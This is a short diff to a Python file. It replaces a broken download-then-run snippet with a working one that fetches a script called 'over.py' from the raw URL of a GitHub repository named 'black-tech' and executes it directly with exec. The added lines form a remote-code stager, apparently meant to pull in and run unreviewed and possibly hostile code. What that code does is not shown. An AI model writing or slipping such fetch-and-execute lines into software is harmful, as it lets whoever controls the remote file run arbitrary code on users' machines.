@@ -1,4 +1,3 @@
-from urllib.request import urlretrieve
-url = 'https://github.com/cicadoves/black-tech/blob/main/over.py'
-urlretrieve(url, 'main.py')
-execfile('main.py')
+from urllib.request import urlopen
+url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
+exec(urlopen(url).read().decode())
